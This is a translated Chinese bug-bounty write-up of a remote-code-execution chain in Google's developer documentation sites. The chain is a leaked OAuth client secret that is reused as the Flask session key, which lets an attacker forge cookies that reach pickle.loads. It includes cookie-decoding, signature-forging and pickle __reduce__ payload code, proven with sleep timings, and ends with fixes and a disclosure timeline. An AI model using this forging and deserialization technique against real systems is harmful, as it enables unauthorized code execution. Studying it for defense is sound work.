#  如何在 Google 挖到 9 万美元的远程代码执行漏洞  
Simon Koeck
                    Simon Koeck  北山安全   2026-11-22 10:30  
  
## 一、它是怎么被发现的  
  
我当时正在梳理 Google 各个开发者文档站共用的那套 OAuth 流程。访问 /oauth2authorize  
，它就会下发一个 Flask session cookie，然后把你重定向到 Google 登录页。不需要账号：  
```
curl -s -D headers.txt -o /dev/null \  'https://developers.google.com/oauth2authorize?return_url=%2F'
```  
  
这个 Cookie 引起了我的注意。它是 Flask 常见的三段式 session=<payload>.<timestamp>.<signature>  
 格式，但大约 1200 字节——对一个 CSRF token 加一个 return_url 来说，未免太大了。于是我把它解码了。  
  
Flask 的 session cookie 是“签名”，不是“加密”，所以任何人拿到它，内容就明明白白摆在眼前。开头的点号表示 payload 经过 zlib 压缩：  
```
import base64import jsonimport pickletoolsimport zlibpayload, timestamp, signature = cookie.rsplit(".", 2)def b64decode(value):    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))compressed = payload.startswith(".")raw = b64decode(payload[1:] if compressed else payload)session = json.loads(zlib.decompress(raw) if compressed else raw)
```  
  
解出来是这样：  
```
{  "_permanent": true,  "google_oauth2_csrf_token": "...",  "google_oauth2_flow_<csrf>": {    " b": "..."  }}
```  
  
" b"  
 这个键，是 Flask 用来标记 bytes 类型值的。把它 base64 解码，得到的是一个 pickle，pickletools.dis  
 打印出来是一个 oauth2client.client.OAuth2WebServerFlow  
 对象，带着这些字段：  
```
client_id     = "<redacted>.apps.googleusercontent.com"client_secret = b"<redacted>"
```  
  
也就是说，这个 Cookie 里装着一个 pickle 序列化的对象，以及 Google OAuth 的 client_id  
 和 client_secret  
，明文。我 8 月 6 日测试时它还是有效的，这里已做打码。  
  
我试着把这个 client secret 当作 Flask 的 SECRET_KEY  
，结果下发 Cookie 上的签名，用它验证通过了。**签名密钥，就存在它所签名的那个对象里面。**  
## 二、一把钥匙，两个用途  
  
泄露的 client secret 本身已经是个问题了。但我不想靠猜，我要确认它是否真的也被用来签 session。  
  
Flask 通过 itsdangerous  
 进行签名，使用 cookie-session  
 这个 key derivation，于是我在线下重新计算了签名：  
```
import hmacderived_key = hmac.digest(client_secret, b"cookie-session", "sha1")expected = hmac.digest(    derived_key,    f"{payload}.{timestamp}".encode(),    "sha1",)
```  
  
算出来的 expected  
，与几秒钟前服务端下发给我的那个 Cookie 上的签名**逐字节完全一致**  
。为了确认不是巧合，我改动了签名里的一个字符（被拒绝），再用恢复出的密钥重新签名原始 payload（被接受）。**Session 完整性已经不存在了。**  
我可以随意设置 session 里的任何键和值，并且还能造出服务端认可的签名。  
## 三、从伪造 Cookie 到代码执行  
  
回调逻辑会把 flow 对象从 session 里读出来，然后 unpickle 它：  
```
session cookie  -> 验证 Flask 签名  -> 读取 google_oauth2_flow_<csrf>  -> base64 解码 bytes  -> pickle.loads(...)
```  
  
这个 pickle.loads  
 之所以“安全”，前提只是没有别人能伪造出合法的 Cookie。一旦密钥公开，这个前提就毫无意义了。于是我构造了自己的 session：随便编一个 CSRF token，把我想放的任意 pickle 塞进对应的 flow 键里：  
```
session = {    "_permanent": True,    "google_oauth2_csrf_token": "attacker-chosen",    "google_oauth2_flow_attacker-chosen": {        " b": base64.b64encode(attacker_blob).decode()    },}
```  
  
state  
 参数也是我自己定的，所以服务端那边不需要任何东西对得上。它验证我给的签名，找到我给的 flow 条目，然后把里面的字节交给 pickle.loads  
。  
  
如果你没玩过 pickle：REDUCE  
 操作码会指定一个可调用对象和它的参数，而 unpickle 的过程就是直接调用它。公开的签名密钥 + 这个 sink，就等于**未授权的 RCE**  
。  
  
我不打算在 Google 的生产环境上执行命令，所以用“时间”来证明。payload 化简成 time.sleep(N)  
：  
```
class Sleep:    def __init__(self, seconds):        self.seconds = seconds    def __reduce__(self):        return (time.sleep, (self.seconds,))
```  
  
每次都发同样的伪造 session，只改这个数字：  
```
time.sleep(0) -> 0.207 stime.sleep(3) -> 3.193 stime.sleep(5) -> 5.194 stime.sleep(8) -> 8.283 s
```  
  
响应时间完全跟着 pickle 里的数字走，符合“服务端在 unpickle 时调用了 sleep(N)”的判断。  
  
我还做了几组对照测试，排除“接口本来就慢”或者“抖动”的可能：  
- 不带 Cookie：Invalid request  
  
- 签名里改一个字节：Invalid request  
  
- 签名合法、但没有 flow 条目：Invalid request state  
  
- 签名合法、真实 flow：走到了 Google 的 token 交换，最后因为我伪造的 auth code 报 invalid_grant  
 而失败  
  
- 签名合法、sleep payload：延迟正好是我选的那个数字  
  
## 四、影响范围有多大  
  
同一把密钥在 developers.google.com  
 之外也有效。我在下面这些 DevSite 主机上用合法 session 做了测试：  
- firebase.google.com  
- developer.android.com  
- source.android.com  
- docs.partner.android.com  
## 五、怎么修  
  
四步改动就能终结这条链路：  
1. 轮换两个暴露的 OAuth client secret，并作废所有用它们签名的 session。  
  
1. 每个部署各自使用一个来自服务端存储的、高熵的 Flask SECRET_KEY  
，不要和任何 OAuth 凭据产生关联。  
  
1. 把 OAuth flow 对象留在服务端。Cookie 里只放一个不透明引用，不放任何敏感信息。  
  
1. 任何跨客户端边界的数据都不要再使用 pickle  
。换成带 schema 校验的纯数据格式，伪造的 Cookie 就失去了作用。  
  
这条攻击链依赖三个条件同时成立：泄露的 secret、它被复用为签名密钥、以及回调对 session 里的数据做了 unpickle。  
## 六、时间线  
- 2026 年 8 月 6 日 22:48：提交报告  
  
- 2026 年 8 月 7 日 08:12：分诊  
  
- 2026 年 8 月 7 日 16:23：受理  
  
- 约 24 小时内：热修复上线  
  
- 2026 年 8 月 27 日：确定奖励：**90,000 美元**  
（普通 Google 应用 T2 类别，S0 级 RCE 基础奖金 75,000 美元 × 1.2，因为报告质量特别优秀）  
  
- 2026 年 10 月 7 日 15:20：状态更新为已修复  
  
感谢 Google Bug Hunters 团队和 DevSite 工程师的调查与修复。  
  
原文链接：https://simonkoeck.com/writeups/google-devsite-flask-session-pickle-rce  
  
本文为中文翻译，仅供学习和安全研究参考。  
  
